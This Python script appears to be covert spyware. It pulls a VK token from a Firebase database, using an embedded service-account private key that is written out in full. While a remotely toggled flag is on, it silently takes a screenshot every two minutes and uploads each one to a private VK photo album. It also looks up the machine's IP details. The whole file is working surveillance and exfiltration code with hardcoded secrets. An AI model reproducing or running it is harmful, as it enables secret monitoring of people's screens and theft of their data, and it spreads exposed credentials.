import os,time,datetime

import pyautogui

import requests

import vk_api

import firebase_admin
from firebase_admin import credentials
from firebase_admin import db


def current_time():
    timing = time.time()
    value = datetime.datetime.fromtimestamp(timing)
    normal_time = value.strftime('%d-%m-%Y %H:%M:%S')
    normal_date = value.strftime('%d-%m-%Y')
    return [normal_time,normal_date]


#Request for ip
responce = requests.get('https://ipinfo.io').json()

#Firebase init
cert={
  "type": "service_account",
  "project_id": "project-66708",
  "private_key_id": "466b4507001f14dd4fb8bcbb2af42d77c873aa83",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCo9CSUcqBbPuXC\niXq4RDTKc6zlcr8ORaGyQT/MekB6NTeEZ2jmdacwgFLNgT6E2XbZK1F+qofXz+Lu\nM28VYPYInQQuyDSTc/ScNEyKmOQ4l+grkXaFsdZqDBkvbnw42R+BR191QI+4BuT+\nwKkGM6kEfjHxIkpKa1ty1qrT+ogGMl6oW9Y/ZX82sCVWyTVuUgihy4vtb6wRFV53\n5lxBxFkCPdffrPw7Ea4BbPknS2HmPrUDPptfbNd109Hxhws4z2cArJnPnDPu6lc/\ntOwqLSaoLGdrot2TCzm/nkQvSRL07P1g57cdBOteZo7+rZY5C2qHEbu/sqNEFXXO\nf+xjLrkFAgMBAAECggEAHXsIXPzJXVKSzcimaLvCCGd5zkmg69Ebn1qCUuAsGwbp\nKonOxJPX+f8SM7ivG4hElC1aWYNRE8e6/bxs0Cqsk6EuRyl4/xe3IYCAsJhwDi33\nfY6ywy5eTv/QbzXUqCi+thSpo/CBg2d0kr00YRgnkFiix0Qn+WdVPCsYAMgQ7x+X\nQ60E6lRZcKFywDR/K/fbKlSuTzC+wAdctS/qrtlXbp1PHwlCa71AgidecxDTDRWa\nEU+RpORnnr4WxPZst6VPBXbTrWAZ2Q1VJfifh8/3r5/l1+H5eVi+BMj5YoR4VApP\nZXnmZWQ8jqzQBd+AWQ3Jh5PZcOe4+ZhLsxCtVY6dAQKBgQDXkBq7bDoOBBSqloz0\nYxuZ+csX5CRoYkv9dYJzFgQraBZaY4RqJ1xfnOxDMmdXI6HhfF679yJcHFf5cagk\neOdIMJdKy+eLpjgrFd3N9Q/3+eOISHzK7wVjcQtJib9AAG5Ius6PSlzkiKPJcJyB\nxq7b3W1fk69iL+T0EeBtl9CFgQKBgQDIpb3LjtRGS2cey5RqIocIFrHlak3rI2f+\nIJvya/cym0Snh7lHBsmSU4lfO6jLMiwEhYGA8t9/L35L97CRkVTHxK5Fnmxa+u7E\noW8IQk+TAOZfP6DauTINqCGWiOMSLJHhjLG40DDdaTCHJgwx1sAeeeIfsHVWkA8I\nUOFB9xndhQKBgH6HM2m3yQvZEVhgLjR0yArFOJS5cTVkHT6U7xEmZyQjYJuFtn+o\nwuvMbFG1EDtxyt9T5TdnhF+Us37TW+KspPUWsHdS4IJz+pwvpZXytoDTyN6Bzd5A\nFmWcQQfVNtEWb6V5IS2ydHwgSCNBWlxChvi/LCfhxBxaCIXKyHULm3YBAoGABrxJ\nmsO4rINresUqvkVacxMP9buT0gjmPMmrcn/dVH2R2G3d8lxv99GGEwRVrjyI7b3t\nkv6UMhjODI7MBpbyWaJolz2yNXum+ELTD1vqf+zPzvK725vL6llyhzMhLEMCwqeO\nb73NZiFZ16+XSTUETgGZbabmyXkciBLu/N/mpmECgYAnNeNKFzTLLu9Eqdvcnt+2\nC2/ZHnTU4JVgyI2iTCOHoifSkYGcghladZFEH6bZNzYFNY4N8w/LievNvC8ayvy2\ntxhf+QNZdFygEWahd7jc2Q4E24JtJ9CZoH/cy0ehOGqhBEzdMeRSVoRJ7bF/pK0v\n/jpQWKv8jky526NZ4WoVWg==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-yhh5y@project-66708.iam.gserviceaccount.com",
  "client_id": "102558281984619488722",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-yhh5y%40project-66708.iam.gserviceaccount.com"
}
cred = credentials.Certificate(cert)
url_link='https://project-66708-default-rtdb.europe-west1.firebasedatabase.app'
url = {'databaseURL' : url_link}
firebase_admin.initialize_app(cred, url)
ref=db.reference(f"/token")


#Vk api
token=str()
for i in ref.get().items():
    token=list(i)[1]['token']
session = vk_api.VkApi(token=token)
vk = session.get_api()


def album_check():
    global album,lst,name
    for i in vk.photos.getAlbums()['items']:
        if i['title']!=f'{name}_({current_time()[1]})':
            lst.append('False')
        else:
            lst.append('True')
            album=i
    if not 'True' in lst:
        vk.photos.createAlbum(title=f'{name}_({current_time()[1]})', privacy_view=['only_me'])
        for i in vk.photos.getAlbums()['items']:
            if i['title'] == f'{name}_({current_time()[1]})':
                album = i
            else:
                pass


def message_send():
    global album
    if album['title']==f'{name}_({current_time()[1]})':
        try:
            server=vk.photos.getUploadServer(album_id=album['id'])
            r=requests.post(server['upload_url'], files={'photo': open('screen.png', 'rb')}).json()
            vk.photos.save(album_id=album['id'], server=r['server'], hash=r['hash'], photos_list=r['photos_list'])
        except vk_api.exceptions.ApiError:
            album_check()


def screen_shot():
    scr = pyautogui.screenshot()
    try:
        os.remove(f'screen.png')
    except FileNotFoundError:
        pass
    scr.save(f'screen.png')
    message_send()
    os.remove(f'screen.png')


name=str()
with open('name.txt', 'r') as file:
    for f in file:
        name=f
lst=[]
album={}
try:
    album_check()
except Exception:
    exit()
var=int(time.time())
while True:
    start = db.reference("/statement_screen")
    for i in start.get().items():
        state = bool(int(list(i)[1]['state']))
    if state:
        count=int(time.time())
        if count-var>120:
            screen_shot()
            var=count
    else:
        pass

